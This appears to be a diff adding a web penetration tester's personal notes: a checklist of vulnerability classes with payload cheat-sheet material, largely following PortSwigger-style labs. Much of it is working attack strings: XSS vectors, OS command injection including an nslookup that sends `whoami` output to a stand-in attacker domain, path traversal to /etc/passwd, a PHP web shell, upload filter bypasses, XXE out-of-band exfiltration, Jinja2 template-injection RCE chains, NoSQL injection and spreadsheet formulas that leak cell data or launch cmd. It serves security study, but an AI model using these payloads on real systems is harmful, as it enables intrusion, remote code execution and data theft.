@@ -1,0 +1,890 @@
+testing start
+
+
+
+
+
+unvalidate redirect  
+
+
+
+IDOR
+exposing API key
+excessive data exposure
+lack of rate limiting
+authorization bugs
+mass assignment
+secuirty misconfiguration - server headers                          ALLWAYS TRY TO ENCODE THE INPUT TO BYPASS VALIDATION
+injection
+bussiness logic vuln
+verbose errors
+directory traversal fuzzing
+test web vulns
+xss
+sqli
+command inj
+
+
+
+api
+v1
+v2
+swaggger
+dev
+api bruteforce
+
+http 0.9 1.0 1.1 2.0 3.0 
+
+ssl 1.0 2.0 3.0
+
+
+GET /ANIL/test?redirect=google.com HTTP/1.1
+
+
+csp if implemented using Meta TAGS vilation reports wil not be sent, vilation reports will be sent only when impleted throught headers .
+
+
+
+
+Always check console 
+
+check robots.txt
+direct access to url like /Admin
+
+
+
+                                                         Testing starts
+
+
+
+
+
+                             1. burp proxy history 
+                             2. Target Scope > site map
+                             3. select any request > engagement tools > content discovery 
+                             4. Developer tools extension for hidden input 
+                             5. Nmap
+                             6. Wfuzz 
+                             7. hakrawler - modify to autocrawl everyday (crawl and save output in a file, crawl nextday and find differenece in both files report if there are any new changes)
+                             8. tomnonmnom - wayback urls 
+                             9. intruder long (check in pro )
+                             10. web shells 
+
+                                         https://github.com/d4t4s3c/Offensive-Reverse-Shell-Cheat-Sheet
+                                         https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html
+                            11. xss
+
+                                                     DOM - it's a web browesrs hireracheal represtation of the elements on a page, developers use javascript to manipulate nodes & elements of the dom. When a website containing javascript takes the user controllable value know as source and pass it to dangerous function known as sink, 
+
+                                                     A source is a javascript property that accepts attacker controlled data like location.search, document.cookie & document.referrer      
+                                                     
+                                                     eval() function is a sink because it process the data passed to it as javascript document.body.innerHTML because it potentially allows attacker to inject HTMl and execute arbitary javascript    
+
+
+                                                     https://michaelhidalgo.medium.com/on-flask-semgrep-and-secure-coding-26290fcdd960     
+
+
+                                                           SEMGREP       
+
+
+
+                                                    build a semgrep tool
+
+
+                                                    <tag> event=onerror onload
+
+                                                    search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';
+                                                    search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>
+
+
+                                                    research more
+
+                                                    1. XSS between HTML tags - 
+
+                                                             When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript. 
+
+                                                                    <h1>haikupayload</h1>
+                                                                         <script>alert(document.domain)</script>
+                                                                         <img src=1 onerror=alert(1)>
+
+
+
+
+                                                    2. XSS in HTML tag attributes -
+
+                                                         When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.
+
+                                                                 <h1> <input type=text placeholder='Search the blog...' name=search value="haikupayload"> </h1>
+                                                                     " autofocus onfocus=alert(document.domain) x="
+
+
+                                                         Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script. For example: 
+
+                                                                        javascript:alert(1)
+
+                                                        hidden & canonical which dont fire automatically
+
+                                                                     <link rel="canonical" accesskey="X" onclick="alert(1)" />
+
+
+
+
+
+                                                    3. XSS into JavaScript -
+
+
+                                                        i. Terminating the existing script
+
+                                                                     <script> var=haiku </script> 
+                                                                            payload :- </script><img src=1 onerror=alert(document.domain)>
+
+
+                                                        ii. Breaking out of script
+
+                                                                 In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.
+
+
+                                                                        '-alert(document.domain)-'
+                                                                        ';alert(document.domain)//
+
+
+                                                        iii. Escaping sting terminator
+
+                                                                escaping any single quote characters with a backslash
+
+
+                                                                     For example, suppose that the input:
+                                                                            ';alert(document.domain)//
+
+                                                                            gets converted to:
+                                                                            \';alert(document.domain)//
+
+                                                                            You can now use the alternative payload:
+                                                                            \';alert(document.domain)//
+
+                                                                            which gets converted to:
+                                                                            \\';alert(document.domain)//
+
+
+
+
+                                                         iv.  HTML encoded & escaped
+
+
+                                                                \'-alert(1)//
+                                                                onerror=alert;throw 1
+
+
+
+                                                         v.  Making use of HTML-encoding
+
+
+                                                               When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.
+
+
+                                                                    <a href="#" onclick="... var input='controllable data here'; ...">
+
+                                                                            &apos;-alert(document.domain)-&apos;
+
+                                                                            http://foo?&apos;-alert(1)-&apos;
+
+
+
+                                                         vi.  JavaScript template literals
+
+                                                                    ${alert(document.domain)}
+                                                                    ${alert(1)}
+
+
+
+
+
+
+                                                                    Client side template injection
+                                                                    dangling markup
+
+
+                                                                  https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
+
+
+                            
+                            13. CORS
+
+
+                                                                SOP 
+
+
+                                                        It generally allows a domain to issue requests to other domains, but not to access the responses. 
+
+                                                        And that is where XSS comes into play. It essentially allows bypassing of the SOP, because now an attacker can execute their script from the same origin as the application (eg facebook.com).
+
+
+                                                        Access-Control-Allow-Credentials: true
+                                                         Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.
+
+
+                                                         not permitted
+
+
+                                                         Access-Control-Allow-Origin: *
+                                                         Access-Control-Allow-Credentials: true
+
+                                                         Access-Control-Allow-Origin: https://*.normal-website.com
+
+
+
+                            14. click jacking
+                            15. web sockets 
+                            16. CSRF 
+
+                                                                    . Change to GET 
+                                                                    . remove token from the request
+                                                                    . token not tied to user session application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
+
+                                                                consider requesting <img> which is available after authentication from another site in the same browser 
+
+                                                                Samesite = strict
+
+                                                                        Will not allow cross site requests to include cookie even when following a link like href or embedd
+
+                                                                        <a>
+                                                                        <ifame>
+                                                                        <script>
+
+
+                                                                Samesite = Lax
+
+                                                                        Will allow cross site requests to include cookie only when following a link 
+                                                                        
+
+
+                                                        
+                                                                Samesite = None ; secure
+
+                                                                            if none is mentioned Secure should be used.
+
+                                                                If samesite is not set; browser will consider as Samesite = Lax but will not show in developer tools in chrome 80+
+
+
+
+
+
+                                                                          "same-site" vs "same-origin"
+
+
+                                                            When we look at the details of SameSite cookies, we're going to be dealing a lot with the concept of "same-site" and "cross-site" requests. This is similar to another phrase you may have heard, "cross-origin" requests, but they are subtly different.
+
+                                                          
+
+
+                                                            In summary, two URLs are considered to be "same-site" if they:
+
+                                                                Have the same scheme i.e. http or https
+                                                                Have the same domain i.e. example.com, andrewlock.net or microsoft.com
+
+                                                            They don't need to have the same port or subdomain.
+
+                                                            Two URLs are considered to be "same-origin" if they
+
+                                                                Have the same scheme i.e. http or https
+                                                                Have the same domain i.e. example.com, andrewlock.net or microsoft.com
+                                                                Have the same subdomain i.e. www.
+                                                                Have the same port (which may be implicit) i.e. port 80 for http and 443 for https
+
+                                                            If we use the URL http://www.example.org and compare against variations, you can see the difference more clearly.
+
+
+
+
+                                                            If we use the URL http://www.example.org and compare against variations, you can see the difference more clearly.
+
+
+                                                                  URL                       Description                       same-site      same-origin
+
+                                                            http://www.example.org          Identical URL                        ✅               ✅
+                                                            http://www.example.org:80       Identical URL (implicit port)        ✅               ✅
+                                                            http://www.example.org:8080     Different port                       ✅               ❌
+                                                            http://sub.example.org          Different subdomain                  ✅               ❌
+                                                            https://www.example.org         Different scheme                     ❌               ❌
+                                                            http://www.example.evil          Different TLD                       ❌               ❌
+
+
+
+                                                            https://andrewlock.net/understanding-samesite-cookies/
+
+
+
+                                                            some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state: 
+
+
+
+
+
+                            17. Access control
+
+
+
+                                                            check robots.txt
+                                                            direct access to url like /Admin
+                                                            check javascript
+                                                            check cookie manipulation -- admin=true; role=1 
+                                                            response manipulation
+                                                            study request & response indepth / modify request based on response parameters
+                                                            check the correct syntax of the payload
+                                                            GET to POST
+                                                            check hidden fields
+                                                            X-Original-URL: /admin
+
+                                                                                    query string goes in url
+                                                                                    url should be /
+                                                            /ADMIN/DELETEUSER --> /admin/deleteUser
+
+                                                            /admin/deleteUser.anything --> /admin/deleteUser
+
+                                                            /admin/deleteUser -- >  /admin/deleteUser/
+
+                                                            read whole response for every request for sensitive info 
+
+                                                            Multistep Access control - directly try to access last step of the flow 
+
+                                                            modify referrer header 
+
+                            18. OS Command Injection
+
+
+                                                            Many instances of OS command injection are blind vulnerabilities.
+
+                                                            & echo aiwefwlguh &
+                                                            |whoami
+                                                            uname -a 
+                                                            ifconfg
+                                                            netstat -an 
+                                                            ps -ef 
+                                                            ;ls
+                                                            ;pwd
+
+                                                            & ping -c 10 127.0.0.1 &
+
+                                                            x||ping+-c+10+127.0.0.1||
+
+                                                            & whoami > /var/www/static/whoami.txt &
+
+                                                            ||whoami>/var/www/images/output.txt||  --> filename=output.txt  you need to request the file from an endpoint which will fetch the file
+
+                                                            & nslookup kgji2ohoyw.web-attacker.com &
+
+                                                            & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+
+                                                            ||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+
+
+
+
+
+
+                            19. Information Disclosure
+
+
+                                                            /robots.txt
+                                                            /sitemap.xml
+                                                            Directory listings
+                                                            Developer comments
+                                                            Error messages
+                                                            productId=13 --> productId="example"
+                                                            /cgi-bin/phpinfo.php
+                                                            backup files 
+
+
+
+                                                            interactsh
+
+                                        
+                            20. Path traversal
+
+
+
+
+                                                            /loadImage?filename=218.png
+                                                            ../../../ -->  /etc/passwd (absolute path)
+                                                            ....//....//....//etc/passwd
+                                                            url encoding or url double encoding 
+                                                            unicode
+                                                            base64
+                                                            hex
+                                                            UTF 
+                                                            /var/www/images/../../../etc/passwd
+                                                            ../../../etc/passwd%00.png
+
+
+                                                            
+                            21. file upload
+
+
+                                                            <?php echo file_get_contents('/home/carlos/secret'); ?>
+                                                            Content-Type to image/jpeg
+                                                            <?php echo system($_GET['command']); ?>
+                                                            Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
+
+                                                             Change the value of the filename parameter to .htaccess.
+                                                             Change the value of the Content-Type header to text/plain.
+
+                                                             Replace the contents of the file (your PHP payload) with the following Apache directive:
+                                                             AddType application/x-httpd-php .l33t
+
+                                                             exploit.php.jpg
+                                                             exploit.asp;.jpg
+                                                             exploit.asp%00.jpg
+                                                             exploit%2Ephp
+                                                             exploit.p.phphp
+                                                             filename="exploit.php%00.jpg
+                                                             ExifTool
+                                                             OPTIONS method
+
+
+                            22. SSRF
+
+
+                                                             which calls any url or resource 
+                                                             http://localhost/admin
+                                                             127.0.0.1
+                                                             2130706433
+                                                             017700000001
+                                                             127.1
+                                                             URL encoding or case variation.
+
+
+
+
+                            23. XXE 
+
+
+                                                                |--> This declaration introduces Document Type Definition, it declares the root element of the document named test
+                                                                |
+                                                                |
+                                                                |       |--> This is name of the document type or root element
+                                                                |       |
+                                                                |       |       |--> is used to define named entities which are place holders 
+                                                                |       |       |     for the text that can be reused within the document it defines an entity named ent 
+                                                                |       |       |
+                                                                |       |       |
+                                                            <!DOCTYPE test [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+                                                            <userInfo>                                  |
+                                                             <firstName>John</firstName>                |
+                                                             <lastName>&ent;</lastName>                 |--> external content such as url's or files
+                                                            </userInfo>         |
+                                                                                |
+                                                                                | --> This is Actual xml content
+
+
+
+                                                            limitations :-
+
+                                                                           i. XXE can only be used to obtain files or responses that contain “valid” XML.
+                                                                           ii. XXE cannot be used to obtain binary files.
+
+
+                                                               it is difficult to exfiltrate plain text files that are not valid XML files (e.g. files that contain XML special characters such as &, < and >)
+
+
+                                                            CDATA - used to make the XML parser interpret contents as text data and not as markup
+
+
+
+                                                            PARAMETER ENTITIES + External DTD
+
+                                                            PARAMETER entities are declared with a % character and are used in DTD not in the XML body 
+
+
+                                                         1.   When XML is hidden & only parameters are used
+
+
+                                                            <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+
+                                                         2.   Create a local SVG image :-
+
+                                                            <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+
+                                                         3.   Modified content type : -
+
+
+                                                            POST /action HTTP/1.0
+                                                            Content-Type: application/x-www-form-urlencoded
+                                                            Content-Length: 7
+
+                                                            foo=bar
+
+
+
+                                                            POST /action HTTP/1.0
+                                                            Content-Type: text/xml
+                                                            Content-Length: 52
+
+                                                            <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+
+                                                            <!DOCTYPE test [<!ENTITY ent "anil"> ]>
+
+
+
+                                                            File retrival
+
+                                                            <!DOCTYPE test [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+
+
+
+                                                            SSRF (Metadata)
+
+                                                            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+
+
+
+                                                            PARAMETER ENTITIES
+
+
+                                                            Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD.
+
+
+                                                            <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+
+                                                            <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+
+                                                            %exfil
+
+                                                            &#x25; = % in XML (to bypass filters)
+
+
+
+
+
+                                                            In certain parsers such as Java's SAX JAXB parser, it is possible to perform directory listing. 
+                                                            <!DOCTYPE root [ <!ENTITY lastname SYSTEM "file:///" > ]><employee id="1"><name>Amy &lastname;</name><salary>6000.0</salary></employee>
+
+                                                            PHP Wrapper
+
+                                                            The PHP language allows stealing of file content regardless whether they contains illegal characters. This is unique to PHP alone.
+
+                                                            PHP has a pseudo url "php://" that when invoked by PHP programs, can be abused to do base64 encoding of a resource before sending to output stream.
+
+                                                            <?xml version="1.0" encoding="UTF-8"?>
+                                                                    <!DOCTYPE r [
+                                                                        <!ENTITY a SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+                                                                    ]>
+
+                                                                    <name> &a; </name>
+
+
+                                                              XINCLUDE -  
+                                                              
+
+                                                               <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+
+                                                               SVG / DOCX 
+                                                             file upload 
+
+
+                                                             <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+
+
+                                                            https://github.com/lc/230-OOB
+                                                            https://github.com/HLOverflow/XXE-study
+                                                            https://academy.ranakhalil.com/courses/2459938/lectures/52042506
+                                                            harsh botra xxe
+                                                      RCE PHP -  https://www.depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection/
+
+                                                             https://academy.ranakhalil.com/p/web-security-academy-video-series
+
+                                                            run requirements.txt
+
+
+                         24. Business logic vulnerabilities
+                         
+
+                                                             "business logic" simply refers to the set of rules that define how the application operates.
+
+
+                                                        1. While adding to cart 
+                                                        2. negative values
+                                                        3. anything@your-email-id.web-security-academy.net
+                                                        4. Remove parameters
+                                                        5. try parameter pollution
+                                                        6. Skip to /my-account
+                                                        7. drop the validation request
+                                                        8. encryption oracle 
+
+
+
+                        25. Authentication  
+
+                                                        2FA - directly access /my-account 
+                                                        Cookie: account=carlos
+
+                                                        OAUTH
+
+
+                        26. API 
+
+                                                        parameter pollution
+
+
+
+                        27. SQLI
+
+                                                        Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query.
+                                                        
+                                                        In UPDATE statements, within the updated values or the WHERE clause.
+                                                        In INSERT statements, within the inserted values.
+                                                        In SELECT statements, within the table or column name.
+                                                        In SELECT statements, within the ORDER BY clause.
+
+                                                                        1. login based - http://testphp.vulnweb.com/login.php
+
+
+                                                          CREATE DATABASE DB1;
+                                                          use db2;
+                                                          CREATE TABLE users;(code)
+                                                          INSERT INTO users (id,email,password) values(1,'admin@test.com,'admin')
+                                                          select * from users;
+                                                          select * from users where id=1;
+
+
+                        28. Race condition
+
+                        29. NO-SQL 
+
+
+                                                        '
+                                                        Gifts'+'
+                                                        Gifts' && 0 && 'x
+                                                        Gifts' && 1 && 'x
+                                                        Gifts%27%7C%7C1%7C%7C%27
+                                                        category=fizzy'%00
+                                                        /lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+
+
+                                                        '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
+                                                        category == '''
+                                                        category == '\''
+                                                        category=fizzy'+%26%26+0+%26%26+'x
+                                                        category=fizzy'+%26%26+1+%26%26+'x
+                                                        category=fizzy%27%7c%7c%31%7c%7c%27
+
+                        30.Graphql
+
+
+                                                        /graphql
+                                                        /api
+                                                        /api/graphql
+                                                        /graphql/api
+                                                        /graphql/graphql
+                                                        /v1
+
+
+                        31. SSTI 
+
+
+                                                        if <z> present XSS
+                                                        if <z> not present SSTI
+
+                                                        <%=foobar%>
+                                                        {{7*'7'}}
+
+                                                        Jinja2
+
+                                                        RCE - {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+                                                              {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo%20 "some code"%20 > somefile2.py') }}
+                                                        {% for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
+                                                        {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+                                                        {{ ''.__class__.mro()[1].__subclasses__() }}
+                                                        {{ ''.__class__.__mro__[1].__subclasses__() }}
+                                                        {{ cycler.__init__.__globals__.os.popen('id').read() }}
+                                                        {{ joiner.__init__.__globals__.os.popen('id').read() }}
+                                                        {{ [].__class__.__base__.__subclasses__() }}
+                                                        {{ namespace.__init__.__globals__.os.popen('id').read() }}
+                                                        {{ lipsum.__globals__["os"].popen('id').read() }}
+
+                                                        NODE JS
+
+                                                        {{ this }}  -> [Object Object]
+                                                        {{ this.__proto__ }} --> [Object Object]
+                                                        {{ this.__proto__.constructor.name }} --> Object
+
+
+
+                                                        try second order 
+
+
+                        32. Web Cache Poisoning 
+
+
+                                                        Try to manipulate unkeyed inputs like headers 
+                                                        Use paraminer 
+                                                        Cachebuster 
+
+                                                        X-Forwarded-Host: innocent-website.co.uk
+                                                        X-Forwarded-Host: a."><script>alert(1)</script>"
+
+                                                        check for cache headers in response X-Cache:
+
+
+
+                        33. Host Header Injection
+
+
+                                                        Host: vulnerable-website.com
+                                                        Host: bad-stuff-here
+
+                                                        GET https://vulnerable-website.com/ HTTP/1.1
+                                                        Host: bad-stuff-here
+
+
+                                                        GET /example HTTP/1.1
+                                                            Host: bad-stuff-here
+                                                        Host: vulnerable-website.com
+
+
+
+                                                        X-Host
+                                                        X-Forwarded-Server
+                                                        X-HTTP-Host-Override
+                                                        Forwarded
+
+
+                                                        if 403 
+                                                        Host : localhost 
+
+
+
+                                                        password reset poisoning 
+
+                         34. LFI
+
+
+                                                        ../../../../../
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+                                                        SSL VS TLS 
+
+
+                                                        SSL1
+                                                        SSL2
+                                                        SSL3 TLS 1.O
+                                                             TLS 1.1
+                                                             TLS 1.2
+                                                             TLS 1.3
+
+
+
+                                                                sudo fuser -k 5000/tcp
+                                                                python3 app.py 5000 
+                                                                systemctl restart apache2
+                                                                systemctl reload apache2
+                                                                udo lsof -nP -iTCP -sTCP:LISTEN
+
+
+
+
+
+https://cdn.acunetix.com/wp-content/uploads/2022/01/11175019/scan-report-testphp.vulnweb.com-owasptopten2021-27_08_2021-12_05-PM.html#PhpUseOnlyCookiesIsDisabled
+
+
+HYPERLINK("http://127.0.0.1:9000?leak="&A4,"POC")
+
+
+=HYPERLINK("http://127.0.0.1:9008?leak="&A10,"POC")
+
+
+='file:///etc/passwd'#$passwd.A1
+
+"bank":"=HYPERLINK(\"http://127.0.0.1:9000?leak=\"&A04&\",\"POC\")",
+
+
+=HYPERLINK("http:///etc/passwd","app")
+
+
+=HYPERLINK(CONCATENATE(\"http://127.0.0.1:9000/\",(\'file:///etc/passwd\')))
+
+
+
+=HYPERLINK("https://GOOGLE.COM","google")
+
+HYPERLINK("http://127.0.0.1:9000?send="&I9,"POC")
+
+="=cmd|' /C open -a Terminal'!A0"
+
+
+
+ 1. Discuss about CORS + email bypass
+ 2. discuss basic authentication vs form based authentication
+ 3. XSS + Contexts
+ 4. SSTI 
+ 5.    Header set content-Security-Policy "default-src 'self' *.medium.com; script-src 'self' 'unsafe-inline'; frame-ancestors 'None'"
+       Header set Strict-Transport-Security: "max-age=6400; includeSubDomain;"
+       Header set X-Frame-Options "DENY"
+       Header set Access-Control-Allow-Origin 'tcs.com'
+       Header set Access-Control-Allow-Credentials "true"
+
+ 6. header always set
+ 7. Samesite
+       
+
+
+
+
+
+<IfModule mod_headers.c>
+
+        Header set content-Security-Policy "default-src 'self' *.medium.com *.test; script-src '14.rs' 'unsafe-inline';" frame-ancestors 'None'"
+
+        Header set Strict-Transport-Security: "max-age=6400; includeSubDomain;"
+#       Header set X-Frame-Options "DENY"x
+#       SetEnvIf Origin "^(.*)$" ORIGIN_DOMAIN=$1
+        Header set Access-Control-Allow-Origin test.com
+        Header set Access-Control-Allow-Credentials "true"
+
+</IfModule>
+
+
+Team connect - Security Engineering from developer perspective 
+
+
+<marquee/onstart=prompt()>
+
+
+
+
+
+                                                        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
